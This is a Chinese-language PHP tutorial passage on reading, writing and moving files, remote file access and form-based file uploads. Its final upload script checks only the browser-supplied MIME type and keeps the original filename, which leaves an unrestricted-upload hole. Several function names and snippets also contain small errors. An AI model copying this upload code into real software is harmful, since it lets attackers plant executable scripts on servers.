<p>另外，写入文件还可以使用fputs()函数，该函数是fwrite()函数的别名函数。如果需要快速写入文件还可以使用file_put_contents()函数，和依次调用fopen(),fwrite()以及fclose()函数的功能一样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$fileName=&quot;data.txt&quot;;             //声明一个变量用来保存文件名</div><div class="line">	$data=&quot;共10行数据\n&quot;;           //声明一个变量用来保存被写入文件中的数据</div><div class="line"></div><div class="line">	for($row=0; $row&lt;10; $row++)     //使用循环形成10行数据</div><div class="line">		$data.=$row.&quot;: www.lampbrother.net\n&quot;;    //将10数据都存放到一个字符串变量中</div><div class="line">		</div><div class="line">	file_put_contents($fileName, $data);		    //一次将所有数据写入到指定的文件中</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>该函数可以将数据直接写入到指定的文件中。如果同时调用多次时，并向同一个文件中写入数据，则文件中只保存了最后一次调用该函数写入的数据。因为在每次调用时都会重新打开文件并将文件中原有的数据清空，所以不能连续写入多行数据。</p>
<h3 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h3><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>fread()</td>
<td style="text-align:left">读取打开的文件</td>
</tr>
<tr>
<td>file_get_contents()</td>
<td style="text-align:left">将文件读入字符串</td>
</tr>
<tr>
<td>fgets()</td>
<td style="text-align:left">从打开的文件中返回一行</td>
</tr>
<tr>
<td>fgetc()</td>
<td style="text-align:left">从打开的文件中返回字符</td>
</tr>
<tr>
<td>file()</td>
<td style="text-align:left">把文件读入一个数组中</td>
</tr>
<tr>
<td>readfile()</td>
<td style="text-align:left">读取一个文件，并输出到输出缓冲</td>
</tr>
</tbody>
</table>
<h4 id="函数fread"><a href="#函数fread" class="headerlink" title="函数fread()"></a>函数fread()</h4><p>该函数用来在打开的文件中读取指定长度的字符串。也可以安全用于二进制文件，在区分二进制文件和文本文件的系统（如Windows）打开文件时，fopen()函数的mode参数要加上’b’。函数fwrite()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string fread(int handle,int length)		//读取打开的文件</div></pre></td></tr></table></figure></p>
<p>该函数从文件指针资源handle中读取最多length个字节。在读取完length个字节数，或到达EOF的时候，或当一个包可用都会停止读取文件，就看先碰到哪种情况了。该函数返回读取的内容字符串，如果失败则返回FALSE。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">     	//从文件中读取指定字节数的内容存入到一个变量中</div><div class="line">	$filename = &quot;data.txt&quot;;                               //将本地文件名保存在变量中</div><div class="line">	$handle = fopen($filename, &quot;r&quot;) or die(&quot;文件打开失败&quot;);   //以只读的方式打开文件，返回文件资源</div><div class="line">	$contents = fread($handle, 100);                       //从文件中读取前100个字节</div><div class="line">	fclose($handle);                                    //关闭文件资源</div><div class="line">	echo $contents;                                    //将从文件中读取的内容输出</div><div class="line">	</div><div class="line">     	//从文件中读取全部内容存入到一个变量中，每次读取一部分，循环读取</div><div class="line">	$filename=&quot;c:\\files\\somepic.gif&quot;;                      //将二进制文件的文件名保存在变量中</div><div class="line">	$handle = fopen ($filename, &quot;rb&quot;) or die(&quot;文件打开失败&quot;);  //以只读的方式打开文件，模式加了’b’</div><div class="line">	$contents = &quot;&quot;;                             //声明一个用于保存全部文件内容的字符串</div><div class="line">	while (!feof($handle)) &#123;                      //循环读取文件中内容，使用feof()判断文件结尾</div><div class="line"> 		 $contents .= fread($handle, 1024);        //每次读取1024个字节</div><div class="line">	&#125;</div><div class="line">	fclose($handle);                            //关闭文件资源</div><div class="line">	echo $contents;                            //将从文件中读取的全部内容输出</div><div class="line"></div><div class="line">     	//另一种从文件中读取全部内容的方法</div><div class="line">	$filename = &quot;data.txt&quot;;                              //将本地文件名保存在变量中</div><div class="line">	$handle = fopen($filename, &quot;r&quot;) or die(&quot;文件打开失败&quot;);  //以只读的方式打开文件，返回文件资源</div><div class="line">	$contents = fread($handle, filesize ($filename));     //使用filesize()函数获取文件长度，一起读出</div><div class="line">	fclose($handle);                               //关闭文件资源</div><div class="line">	echo $contents;                               //将从文件中读取的全部内容输出</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>如果你只是想将一个文件的内容读入到一个字符串中，可以用file_get_contents()函数，它的性能比上面的代码好得多。file_get_contents()函数用来将文件的内容读入到一个字符串中的首选方法，如果操作系统支持还会使用内存映射技术来增强性能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo file_get_contents(&quot;data.txt&quot;);			//读取文本文件中的内容并输出</div><div class="line">	echo file_get_contents(&quot;c:\\files\\somepic.gif&quot;);				//读取二进制文件中的内容并输出</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数fgets-、fgetc"><a href="#函数fgets-、fgetc" class="headerlink" title="函数fgets()、fgetc()"></a>函数fgets()、fgetc()</h4><p>该函数一次至多从打开的文件资源中读取一行内容。函数fgets()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string fgets(int handle[,int length)			//从打开的文件中返回一行</div></pre></td></tr></table></figure></p>
<p>第一个参数提供使用fopen()函数打开的资源。如果提供了第二个可选参数length，该函数返回length-1个字节。或者返回遇到换行或EOF之前读取的所以内容。如果忽略可选的length参数，默认为1024个字符前遇到换行符号，因此每次成功调用都会返回下一行。如果读取失败则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$handle = fopen(&quot;data.txt&quot;, &quot;r&quot;)  or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</div><div class="line">	while (!feof($handle)) &#123;                   	//循环读取第一行，使用feof判断读取文件结尾</div><div class="line">  		$buffer = fgets($handle, 4096);         //一次读取打开文件中的一行内容</div><div class="line">   		echo $buffer.&quot;&lt;br&gt;&quot;;                 	//输出每一行，并加上HTML的换行标记</div><div class="line">	&#125;</div><div class="line">	fclose($handle);                         	//关闭打开的文件资源</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>函数fgetc()在打开的文件资源中只读取当前指针位置处的一个节符。如果遇到文件结束标志EOF时，将返回FALSE值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$fp = fopen(&apos;data.txt&apos;, &apos;r&apos;) or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</div><div class="line">	</div><div class="line">	while (false !== ($char = fgetc($fp))) &#123;      //循环文件中读取一个节符碰到 EOF 标记停止</div><div class="line">   		 echo $char.&quot;&lt;br&gt;&quot;;                 //输出单个字符</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数file"><a href="#函数file" class="headerlink" title="函数file()"></a>函数file()</h4><p>该函数非常有用，与file_get_contents()类似，不需要使用fopen()函数打开文件，不同的是file()函数可以把整个文件读入到一个数组中。数组中的每个元素对应文件中的行，各元素由换行符分隔，同时换行符仍附加在每个元素的末尾。这样，就可以使用数组的相关函数对文件内容进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	print_r(file(&quot;test.txt&quot;);			//将文件test.txt中的内容读入到一个数组中，并输出。</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数readfile"><a href="#函数readfile" class="headerlink" title="函数readfile()"></a>函数readfile()</h4><p>该函数可以读取指定的整个文件，立即输出到输出缓冲区，并返回读取的字节数。该函数也不需要使用fopen()函数打开文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	readfile(&quot;data.txt&quot;);			//直接将文件data.txt中的数据独处并输出到浏览器</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="访问远程文件"><a href="#访问远程文件" class="headerlink" title="访问远程文件"></a>访问远程文件</h3><p>使用PHP不仅可以让用户通过浏览器访问服务器端的文件，还可以通过HTTP或FTP等协议访问其他服务器中的文件，可以在大多数需要文件名作为参数的函数中使用HTTP和FTP URL来代替文件名。使用fopen()函数将指定的文件名与资源绑定到一个流上，如果文件名是“scheme://..”的格式，则被当成一个URL，PHP将搜索协议处理器来处理此模式。<br>如果需要访问远程文件，必须在PHP的配置文件中激活“allow_url_fopen”选项，才能使用fopen()函数打开远程文件。而且还要确定其他服务器中的文件是否有访问权限，如果使用HTTP协议对远程文件进行连接，只能以“只读”模式打开。如果需要访问的远程FTP服务器中，对所提供的用户开启了“可写”权限，则使用FTP协议连接远程的文件时，就可以使用“可写”或“可读”模式打开文件。但不可以使用“可读可写”的模式。<br>使用PHP访问远程文件就向访问本地文件一样，都是使用相同的读写函数处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$file = fopen (&quot;http://www.lampbrother.com/&quot;, &quot;r&quot;) or die(&quot;打开远程文件失败！！&quot;);  //打开远程文件</div><div class="line"></div><div class="line">	while (!feof ($file)) &#123;              //循环从文件中读取内容</div><div class="line">    		$line = fgets ($file, 1024);     //每读取一行</div><div class="line">         //如果找到远程文件中的标题标记则取出标题，并退出循环，不在读取文件</div><div class="line">   		if (preg_match(&quot;/&lt;title&gt;(.*)&lt;\/title&gt;/&quot;, $line, $out)) &#123;    //使用正则匹配标题标记</div><div class="line">     			$title = $out[1];                        //将标题标记中的标题字符取出</div><div class="line">      			break;                                //退出循环，结束远程文件读取</div><div class="line">   		&#125;</div><div class="line">	&#125;</div><div class="line">	fclose($file);                  //关闭文件资源</div><div class="line">	echo $title;                   //输出获取到的远程网页的标题</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	//在ftp.lampbrother.net的远程服务器上创建文件，以写的模式打开</div><div class="line">	$file = fopen(&quot;ftp://user:password@ftp.lampbrother.net/path/to/file&quot;,&quot;w&quot;);</div><div class="line">	fwrite($file,&quot;Linux+Apache+MySQL+PHP&quot;);   	//将一个字符串写入到远程文件中去</div><div class="line">	fclose($file);				//关闭文件资源</div></pre></td></tr></table></figure>
<h3 id="移动文件指针"><a href="#移动文件指针" class="headerlink" title="移动文件指针"></a>移动文件指针</h3><p>在对文件进行读写过程中，有时需要在文件中跳转、从不同位置读取，以及将数据写入到不同的位置。指针的位置是以从文件头开始的字节数度量的，默认以不同模式打开文件时，文件指针通常在文件的开头或者结尾处，可以通过ftell()、fseek()和rewind()三个函数对文件指针进行操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int ftell(resource handle)				//返回文件指针的当前位置</div><div class="line">int fseek(resource handle,int offset[,int whence])			//移动文件指针到指定位置</div><div class="line">bool rewind(resource handle)			//移动文件指针到文件的开头</div></pre></td></tr></table></figure></p>
<p>使用这些函数时，必须提供一个用fopen()函数打开的、合法的文件指针。函数ftell()获取由指定的资源中的文件指针当前位置的偏移量;函数rewind()将文件指针移回到指定资源的开头；而函数fseek()则将指针移动到第二个参数offset指定的位置，如果没有提供第三个可选参数whence，则位置将设置为从文件开头的offset字节处。否则，第三个参数whence可以设置为三个可能的值，它将影响指针的位置。</p>
<ul>
<li>SEEK_CUR:设置指针位置为当前位置加上第二个参数所提供的offset字节</li>
<li>SEEK_END：设置指针位置为EOF加上offset字节。在这里，offset必须设置为负值</li>
<li>SEEK_SET:设置指针位置为offset字节处。这与忽略第三个参数whence效果相同。<br>如果fseek()函数执行成功，将返回0，失败则返回-1.如果将文件以追加模式“a”或者“a+”打开，写入文件的任何数据总是会被附加在后面，不会管文件指针的位置。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$fp = fopen(&apos;data.txt&apos;, &apos;r&apos;) or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</div><div class="line">	</div><div class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //输出刚打开文件的指针默认位置，指针在文件的开头位置为0</div><div class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //读取文件中的前10个字符输出，指针位置发生了变化</div><div class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //读取文件的前10个字符之后，指针移动的位置在第10个字节处</div><div class="line">	fseek($fp, 100, SEEK_CUR);   	//将文件指针的位置，由当前位置向后移动100个字节数</div><div class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //文件位置在110个字节处</div><div class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //读取110到120字节数位置的字符串，读取后指针的位置为120</div><div class="line">	fseek($fp, -10, SEEK_END);   	//又将指针移动到倒数10个字节位置处</div><div class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //输出文件中最后10个字符	</div><div class="line">	rewind($fp);                 	//又移动文件指针到文件的开头</div><div class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //指针在文件的开头位置，输出0</div><div class="line"></div><div class="line">	fclose($fp);                	//关闭文件资源</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="文件的一些基本操作函数"><a href="#文件的一些基本操作函数" class="headerlink" title="文件的一些基本操作函数"></a>文件的一些基本操作函数</h4><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:left">语法结构</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>copy()</td>
<td style="text-align:left">copy(来源文件，目的文件)</td>
<td style="text-align:left">复制文件</td>
</tr>
<tr>
<td>unlike()</td>
<td style="text-align:left">unlike(目标文件)</td>
<td style="text-align:left">删除文件</td>
</tr>
<tr>
<td>ftruncate()</td>
<td style="text-align:left">ftruncate(目标文件资源，截取长度)</td>
<td style="text-align:left">将文件截断到指定长度</td>
</tr>
<tr>
<td>rename()</td>
<td style="text-align:left">rename(旧文件名，新文件名)</td>
<td style="text-align:left">重命名文件或目录</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	if(copy(&apos;./file1.txt&apos;, &apos;../data/file2.txt&apos;)) &#123;              //复制文件示例</div><div class="line">		echo &quot;文件复制成功！&quot;;</div><div class="line">	&#125;else&#123;</div><div class="line">		echo &quot;文件复制失败！&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$filename=&quot;file1.txt&quot;;                           //删除文件示例</div><div class="line">	if(file_exists($filename))&#123;</div><div class="line">		if(unlink($filename)) &#123;</div><div class="line">			echo &quot;文件删除成功！&quot;;</div><div class="line">		&#125;else&#123;</div><div class="line">			echo &quot;文件删除失败！&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;else&#123;</div><div class="line">		echo &quot;目标文件不存在&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if(rename(&apos;./demo.php&apos;, &apos;./demo.html&apos;)) &#123;           //重命名文件示例</div><div class="line">		echo &quot;文件重命名成功！&quot;;</div><div class="line">	&#125;else&#123;</div><div class="line">		echo &quot;文件重命名失败&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$fp=fopen(&apos;./data.txt&apos;, &quot;r+&quot;) or die(&apos;文件打开失败&apos;);  //截取文件示例</div><div class="line">	if(ftruncate($fp, 1024)) &#123;</div><div class="line">		echo &quot;文件截取成功！&quot;;</div><div class="line">	&#125;else&#123;</div><div class="line">		echo &quot;文件截取失败！&quot;;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="文件的上传和下载"><a href="#文件的上传和下载" class="headerlink" title="文件的上传和下载"></a>文件的上传和下载</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="客户端上传设置"><a href="#客户端上传设置" class="headerlink" title="客户端上传设置"></a>客户端上传设置</h4><p>文件上传的最基础方法，是使用HTML表单选择本地文件进行提交，在form表单中可以通过<input="file">标记选择本地文件。如果支持文件上传操作，必须在<form>标签中将enctype和method两个属性指明相应的值。</form></input="file"></p>
<ul>
<li>enctype=”munltipart/form-data”用来指定表单编码数据方式，让服务器知道，我们要传递一个文件，并带有常规的表单信息</li>
<li>method=”POST”用来指明发送数据的方法。<br>另外，还需要在form表单中设置一个hidden类型的input框。其中name值为MAX_FILL_SIZE的隐藏值域，并通过设置其VALUE的值限制上传文件的大小（单位字节），但这个值不能超过PHP的配置文件中upload_max_filesize值设置的大小。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		&lt;form action=&quot;upload.php&quot;  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">			&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000&quot;&gt;</div><div class="line">			选择文件：&lt;input type=&quot;file&quot; name=&quot;myfile&quot;&gt;</div><div class="line">			&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="在服务器端通过PHP处理上传"><a href="#在服务器端通过PHP处理上传" class="headerlink" title="在服务器端通过PHP处理上传"></a>在服务器端通过PHP处理上传</h4><p>客户端的上传表单只能提供本地文件选择，以及提供将文件发送给服务器的标准化方式，但并没有提供相关功能来确定文件到达目的地后发生了什么。所以上传文件的接收和后续处理就要通过PHP脚本来处理。要通过PHP成功地管理文件上传，需要通过以下三方面信息。</p>
<ul>
<li>设置PHP配置文件中的指令：用于精细地调节PHP的文件上传功能</li>
<li>$_FILES多维数组：用于存储各种与上传文件有关的信息。</li>
<li>PHP的文件上传处理函数：用于上传文件的后续处理。</li>
</ul>
<h5 id="PHP配置文件中与文件上传有关的选项"><a href="#PHP配置文件中与文件上传有关的选项" class="headerlink" title="PHP配置文件中与文件上传有关的选项"></a>PHP配置文件中与文件上传有关的选项</h5><table>
<thead>
<tr>
<th>指令名</th>
<th style="text-align:left">默认值</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_uploads</td>
<td style="text-align:left">ON</td>
<td>确定服务器上的PHP脚本是否可以接受HTTP文件上传</td>
</tr>
<tr>
<td>memory_limit</td>
<td style="text-align:left">8M</td>
<td>设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存</td>
</tr>
<tr>
<td>upload_max_filesize</td>
<td style="text-align:left">2M</td>
<td>限制PHP处理上传文件大小的最大值，此值必须小于post_max_size值</td>
</tr>
<tr>
<td>post_max_size</td>
<td style="text-align:left">8M</td>
<td>限制通过POST方法可以接受信息的最大值，此值应当大于配置指令upload_max_file的值，因为除了上传的文件之外，还可能传递其他的表单域</td>
</tr>
<tr>
<td>upload_tmp_dir</td>
<td style="text-align:left">NULL</td>
<td>上传文件存放的临时路径，可以是一个绝对路径。这个目录对于拥有此服务器进程用户必须是可写的。上传的文件在处理之前必须成功传输到服务器，所以必须指定一个位置，可以临时放置这些文件，知道文件移到最终目的地为止。例如：upload_tmp_dir=/tmp/.uploads/。默认值为NULL则为操作系统的临时文件夹</td>
</tr>
</tbody>
</table>
<p>表单提交给服务器的数据，可以通过在PHP脚本中使用全局数组 $_GET、 $_POST或 $_REQUEST 接收。而通过POST方法上传的文件有关信息都被存储在多维数组 $_FILES中，这些信息对于通过PHP脚本上传到服务器的文件至关重要。因为文件上传后，首先存储于服务器的临时目录中，同时在PHP脚本中就获取一个$_FILES全局数组。$_FILES数组的第二维中共有五项。</p>
<h5 id="全局数组-FILES中的元素说明"><a href="#全局数组-FILES中的元素说明" class="headerlink" title="全局数组$_FILES中的元素说明"></a>全局数组$_FILES中的元素说明</h5><table>
<thead>
<tr>
<th>数组</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_FILES[“myfile”][“name”]</td>
<td style="text-align:left">客户端机器文件的原名称，包括扩展名</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“size”]</td>
<td style="text-align:left">已上传文件的大小，单位为字节</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“tmp_name”]</td>
<td style="text-align:left">文件被上传后，在服务器端存储的临时文件名。这是存储在临时目录（由PHP指令upload_tmp_dir指定）中所指定的文件名</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“error”]</td>
<td style="text-align:left">伴随文件上传时产生的错误信息，有五个可能的值。<em>    0：表示没有发生任何错误，文件上传成功</em>    1：表示上传文件的大小超出了在PHP配置文件中指令upload_max_filesize选项限制的值<em>    2：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项指定的值</em>    3：表示文件只被上载*    4：标识没有上载任何文件</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“type”]</td>
<td style="text-align:left">获取从客户端上传文件MIME类型，MIME类型规定了各种文件格式的类型，每种MIME类型都是由“/”分隔的主类型和子类型组成，如“image/gif”，主类型为“图像”,子类型为GIF格式的文件，“text/html”代表文本的HTML文件，还有很多其他不同类型的文件。</td>
</tr>
</tbody>
</table>
<ul>
<li>函数is_upload_file()<br>该函数判断指定的文件是否通过HTTP POST上传的，如果是则返回TRUE。用于防止潜在的攻击者对原本不能通过脚本交互的文件进行非法管理，这可以用来确保恶意的用户无法欺骗脚本去访问不能访问的文件，例如/etc/passwd。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bool is_uploaded_file( string filename)			//判断指定的文件是否通过HTTP POST上传的</div></pre></td></tr></table></figure>
</li>
</ul>
<p>为了能使此函数正常工作，唯一的参数必须指定类似于$_FILES[‘userfile’][‘tmp_name’]的变量，才能判断指定的文件确定是上传文件。如果使用从客户端上传的文件名$_FILES[‘userfile’][‘name’]则不能正常运作。</p>
<ul>
<li>函数move_uploaded_file()<br>文件上传后，首先会存储于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置。此函数的原型如下所示<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bool move_uploaded_file(string filename,string destination)				//将上传的文件移动到新位置</div></pre></td></tr></table></figure>
</li>
</ul>
<p>虽然函数copy()和函数move()也同样好用，但函数move_uploaded_file()还提供了一种额外的功能，检查并确保由第一个参数filename指定的文件，是否是合法的上传文件。如果文件合法，则将其移到为由第二个参数destination指定的文件。如果filename不是合法的上传文件，不会出现任何操作，将返回FALSE。如果filename是合法的上传文件，但处于某些原因无法移动，不会出现任何操作，也将返回FALSE。此外还会发出一条警告。若成功则返回TRUE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	if($_FILES[&apos;myfile&apos;][&apos;error&apos;] &gt; 0) &#123;      //判断文件是否可以成功上传到服务器，0表示上传成功</div><div class="line">		echo &apos;上传错误: &apos;;</div><div class="line">    		switch ($_FILES[&apos;myfile&apos;][&apos;error&apos;]) &#123;</div><div class="line">     			case 1:  </div><div class="line">				echo &apos;上传文件大小超出了PHP配置文件中的约定值：upload_max_filesize&apos;;  </div><div class="line">				break;</div><div class="line">			case 2:  </div><div class="line">				echo &apos;上传文件大小超出了表单中的约定值：MAX_FILE_SIZE&apos;;  </div><div class="line">				break;</div><div class="line">			case 3:  </div><div class="line">				echo &apos;文件只被部分上载&apos;; </div><div class="line">			       	break;</div><div class="line">			case 4:  </div><div class="line">				echo &apos;没有上传任何文件&apos;; </div><div class="line">			       	break;</div><div class="line">   		&#125;</div><div class="line">		exit;       //如果$_FILES[&apos;myfile&apos;][&apos;error&apos;]大于0都是有错误，输出错误信息并退出程序</div><div class="line">	&#125;</div><div class="line">     	//获取上传文件的MIME类型中的主类型和子类型</div><div class="line">	list($maintype,$subtype)=explode(&quot;/&quot;,$_FILES[&apos;myfile&apos;][&apos;type&apos;]);	</div><div class="line">  	if ($maintype==&quot;text&quot;) &#123;    //通过主类型限制不能上传文本文件，例如.txt .html .php等文件文件</div><div class="line">		echo &apos;问题: 不能上传文本文件。&apos;;</div><div class="line">		exit;                //如果用户上传文本文件则退出程序</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$upfile = &apos;./uploads/&apos;.time().$_FILES[&apos;myfile&apos;][&apos;name&apos;];     //定义上传后的位置和新文件名</div><div class="line">	if (is_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;])) &#123;     //判断是否为上传文件</div><div class="line"> 	    	if (!move_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;], $upfile)) &#123;   //从移动文件</div><div class="line">        		echo &apos;问题: 不能将文件移动到指定目录。&apos;;</div><div class="line">       		exit;</div><div class="line">		&#125;</div><div class="line"> 	&#125;else&#123;</div><div class="line">		echo &apos;问题: 上传文件不是一个合法文件: &apos;;</div><div class="line">		echo $_FILES[&apos;myfile&apos;][&apos;name&apos;];</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	echo &apos;文件&apos;.$upfile.&apos;上传成功,大小为&apos;.$_FILES[&apos;myfile&apos;][&apos;size&apos;].&apos;！&lt;br&gt;&apos;;   //如果文件上传成功则输出</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
